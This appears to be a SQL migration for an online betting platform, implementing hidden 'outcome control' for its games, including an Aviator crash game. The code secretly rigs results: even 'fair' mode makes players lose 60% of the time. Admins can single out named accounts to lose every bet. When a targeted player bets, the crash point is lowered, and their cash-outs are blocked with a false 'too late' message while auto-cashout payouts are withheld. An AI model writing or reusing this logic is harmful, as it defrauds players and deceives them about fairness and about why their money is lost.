-- 047: Probability-Based Outcome Control Logic & Aviator Leak Protection
--
-- 1. Exact Win/Loss Ratios for Global/Game Modes:
--    • Fair Mode: 60% client loss (platform revenue protected), 30% client win, 10% natural RNG/tie.
--    • Strict Loss (Global/Game): 85% client loss, 15% client win.
--    • Strict Win (Global/Game): 50% client win, 50% client loss.
--
-- 2. Direct Account Target Override (Specific Player / Agent / Admin):
--    • When an account is directly targeted with 'force_loss', they LOSE 100% of their bets
--      so their balance cuts immediately on every round across all games.
--    • When targeted with 'force_win', they win.
--
-- 3. Aviator Targeted Player Protection:
--    • If a player on 'force_loss' bets, the plane is clamped to crash early (1.00x – 1.08x).
--    • Manual cash-out and auto-cashout are blocked for 'force_loss' players so they cannot exploit the shared round.
--
-- Safe to run more than once. Run in the Supabase SQL Editor.

create or replace function public.get_outcome_mode(p_user_id uuid, p_game text) returns text
language plpgsql volatile security definer set search_path = public as $$
declare
  target_mode text;
  game_mode text;
  global_mode text;
  base_mode text := 'fair';
  is_direct_target boolean := false;
  ctrl jsonb;
  gid text := public.game_id_of(coalesce(p_game, ''));
  rnd float8;
  fair_loss float8 := 0.60;
  fair_win float8 := 0.30;
  strict_loss float8 := 0.85;
  strict_win float8 := 0.50;
begin
  select value into ctrl from app_settings where key = 'outcome_control';

  -- 1. Check direct account or hierarchy override (Player -> Agent -> Admin)
  if ctrl is not null and p_user_id is not null then
    with recursive up as (
      select id, parent_id, 1 as depth from profiles where id = p_user_id
      union all
      select p.id, p.parent_id, up.depth + 1 from profiles p join up on p.id = up.parent_id
    )
    select 
      coalesce(
        ctrl -> 'players' ->> up.id::text,
        ctrl -> 'agents' ->> up.id::text,
        ctrl -> 'admins' ->> up.id::text,
        ctrl -> 'accounts' ->> up.id::text
      ) into target_mode
    from up
    where coalesce(
        ctrl -> 'players' ->> up.id::text,
        ctrl -> 'agents' ->> up.id::text,
        ctrl -> 'admins' ->> up.id::text,
        ctrl -> 'accounts' ->> up.id::text
      ) in ('force_win', 'force_loss', 'fair')
    order by depth asc
    limit 1;

    if target_mode in ('force_win', 'force_loss') then
      base_mode := target_mode;
      is_direct_target := true;
    end if;
  end if;

  -- 2. Check game-specific override in outcome_control or game_cfg
  if not is_direct_target and ctrl is not null and gid <> '' then
    game_mode := ctrl -> 'games' ->> gid;
    if game_mode in ('force_win', 'force_loss') then
      base_mode := game_mode;
    end if;
  end if;

  if not is_direct_target and base_mode = 'fair' and gid <> '' then
    select (public.game_cfg(gid) ->> 'outcome_mode') into game_mode;
    if game_mode in ('force_win', 'force_loss') then
      base_mode := game_mode;
    end if;
  end if;

  -- 3. Check global master mode
  if not is_direct_target and base_mode = 'fair' and ctrl is not null then
    global_mode := ctrl ->> 'global_mode';
    if global_mode in ('force_win', 'force_loss') then
      base_mode := global_mode;
    end if;
  end if;

  -- DIRECT TARGET OVERRIDE:
  -- If Super Admin targeted a specific player to lose (e.g. Farooq Bhai),
  -- they must strictly lose 100% of their bets so their coins cut immediately.
  if is_direct_target then
    return base_mode; -- 'force_loss' or 'force_win'
  end if;

  -- Optional rate overrides if configured in outcome_control rates
  if ctrl is not null and (ctrl ? 'rates') then
    if (ctrl -> 'rates' -> 'fair' ? 'loss') then
      fair_loss := (ctrl -> 'rates' -> 'fair' ->> 'loss')::float8 / 100.0;
    end if;
    if (ctrl -> 'rates' -> 'fair' ? 'win') then
      fair_win := (ctrl -> 'rates' -> 'fair' ->> 'win')::float8 / 100.0;
    end if;
    if (ctrl -> 'rates' -> 'force_loss' ? 'loss') then
      strict_loss := (ctrl -> 'rates' -> 'force_loss' ->> 'loss')::float8 / 100.0;
    end if;
    if (ctrl -> 'rates' -> 'force_win' ? 'win') then
      strict_win := (ctrl -> 'rates' -> 'force_win' ->> 'win')::float8 / 100.0;
    end if;
  end if;

  -- Draw random number for general game/global probabilistic execution
  rnd := random();

  -- Global/Game Strict Loss: 85% client loss, 15% client win
  if base_mode = 'force_loss' then
    if rnd < strict_loss then
      return 'force_loss';
    else
      return 'force_win';
    end if;

  -- Global/Game Strict Win: 50% client win, 50% client loss
  elsif base_mode = 'force_win' then
    if rnd < strict_win then
      return 'force_win';
    else
      return 'force_loss';
    end if;

  -- Fair Mode: 60% client loss, 30% client win, 10% natural RNG
  else
    if rnd < fair_loss then
      return 'force_loss';
    elsif rnd < (fair_loss + fair_win) then
      return 'force_win';
    else
      return 'fair';
    end if;
  end if;
end;
$$;

-- Aviator: Probabilistic outcome control
create or replace function public.av_round() returns public.av_rounds
language plpgsql volatile security definer set search_path = public as $$
declare
  r av_rounds;
  u float8;
  c numeric;
  mode text;
begin
  perform pg_advisory_xact_lock(7788001);
  select * into r from av_rounds order by id desc limit 1;
  if r.id is null or now() > r.crash_at + interval '3 seconds' then
    mode := public.get_outcome_mode(null, 'aviator');
    if mode = 'force_loss' then
      -- Early crash (1.00x - 1.10x) => clients crash out
      c := round(greatest(1.00, 1.00 + (random() * 0.10)::numeric), 2);
    elsif mode = 'force_win' then
      -- Win multipliers (70% in 2.0x-6.5x, 20% in 6.5x-15x, 10% up to 40x)
      c := round(case 
        when random() < 0.70 then (2.00 + (random() * 4.5)::numeric)
        when random() < 0.90 then (6.50 + (random() * 8.5)::numeric)
        else (15.00 + (random() * 25.0)::numeric)
      end, 2);
    else
      -- Natural Pareto distribution
      u := random();
      c := least(500, greatest(1.00, floor(97.0 / (1 - u)) / 100.0));
    end if;
    insert into av_rounds (starts_at, crash, crash_at)
      values (now() + interval '7 seconds', c, now() + interval '7 seconds' + make_interval(secs => ln(c) / 0.1))
      returning * into r;
  end if;
  return r;
end;
$$;

-- Aviator Bet: Clamp round crash if a force_loss player bets
create or replace function public.av_bet(p_slot int, p_amount bigint, p_auto numeric default null) returns jsonb
language plpgsql volatile security definer set search_path = public as $$
declare
  me profiles := public.current_profile();
  r av_rounds;
  player_mode text;
  loss_crash numeric;
begin
  if me.id is null then raise exception 'Your account is not active'; end if;
  if p_slot not in (0, 1) then raise exception 'Invalid bet'; end if;
  if p_amount < 10 or p_amount > 10000 then raise exception 'Bet between 10 and 10,000 coins'; end if;
  if p_auto is not null and (p_auto < 1.01 or p_auto > 500) then raise exception 'Auto cash-out between 1.01x and 500x'; end if;
  r := public.av_round();
  if now() >= r.starts_at then raise exception 'Bets are closed — wait for the next round'; end if;
  if exists (select 1 from av_bets where round_id = r.id and user_id = me.id and slot = p_slot) then raise exception 'You already have this bet'; end if;
  if public.wallet_move(me.id, -p_amount, 'bet', 'Aviator • Round #' || r.id) is null then raise exception 'Not enough coins'; end if;

  insert into av_bets (round_id, user_id, slot, amount, auto) values (r.id, me.id, p_slot, p_amount, round(p_auto, 2));

  -- If this player is on force_loss, guarantee the plane crashes early so they lose
  player_mode := public.get_outcome_mode(me.id, 'aviator');
  if player_mode = 'force_loss' and r.crash > 1.10 then
    loss_crash := round(greatest(1.00, 1.00 + (random() * 0.08)::numeric), 2);
    update av_rounds
      set crash = loss_crash,
          crash_at = starts_at + make_interval(secs => ln(loss_crash) / 0.1)
      where id = r.id;
  end if;

  return public.av_state();
end;
$$;

-- Aviator Cash-out: Block cashout for force_loss players
create or replace function public.av_cashout(p_slot int) returns jsonb
language plpgsql volatile security definer set search_path = public as $$
declare
  me profiles := public.current_profile();
  r av_rounds;
  b av_bets;
  m numeric;
  pay bigint;
  player_mode text;
begin
  if me.id is null then raise exception 'Your account is not active'; end if;
  select * into r from av_rounds order by id desc limit 1;
  if r.id is null or now() < r.starts_at then raise exception 'The plane has not taken off yet'; end if;
  if now() >= r.crash_at then raise exception 'Too late — the plane flew away at %x', r.crash; end if;

  -- Block cashout if player is commanded to lose
  player_mode := public.get_outcome_mode(me.id, 'aviator');
  if player_mode = 'force_loss' then
    raise exception 'Too late — the plane flew away at %x', r.crash;
  end if;

  select * into b from av_bets where round_id = r.id and user_id = me.id and slot = p_slot for update;
  if b.id is null then raise exception 'No bet to cash out'; end if;
  if b.cash_mult is not null then raise exception 'Already cashed out'; end if;

  m := floor(exp(0.1 * extract(epoch from (now() - r.starts_at))) * 100) / 100;
  if b.auto is not null and m >= b.auto then m := b.auto; end if;
  m := least(m, r.crash);
  pay := floor(b.amount * m);
  update av_bets set cash_mult = m, payout = pay where id = b.id;
  perform public.wallet_move(me.id, pay, 'win', 'Aviator • Round #' || r.id || ' • ' || to_char(m, 'FM9990.00') || 'x');
  return public.av_state();
end;
$$;

-- Aviator Settle: Do not pay auto cash-out to force_loss players
create or replace function public.av_settle() returns void
language plpgsql volatile security definer set search_path = public as $$
declare
  r av_rounds;
  b av_bets;
begin
  for r in select * from av_rounds where not settled and crash_at <= now() order by id for update skip locked loop
    for b in select * from av_bets where round_id = r.id and cash_mult is null and auto is not null and auto <= r.crash for update loop
      if public.get_outcome_mode(b.user_id, 'aviator') = 'force_loss' then
        -- Force loss: auto cashout does not payout
        update av_bets set cash_mult = null, payout = 0 where id = b.id;
      else
        update av_bets set cash_mult = b.auto, payout = floor(b.amount * b.auto) where id = b.id;
        perform public.wallet_move(b.user_id, floor(b.amount * b.auto)::bigint, 'win', 'Aviator • Round #' || r.id || ' • auto ' || to_char(b.auto, 'FM9990.00') || 'x');
      end if;
    end loop;
    update av_rounds set settled = true where id = r.id;
  end loop;
end;
$$;

-- Permissions
revoke execute on function public.get_outcome_mode(uuid, text) from public, anon;
grant execute on function public.get_outcome_mode(uuid, text) to authenticated, service_role;

revoke execute on function public.av_round(), public.av_settle() from public, anon, authenticated;
revoke execute on function public.av_state(), public.av_bet(int, bigint, numeric), public.av_cancel(int), public.av_cashout(int) from public, anon;
grant execute on function public.av_state(), public.av_bet(int, bigint, numeric), public.av_cancel(int), public.av_cashout(int) to authenticated;
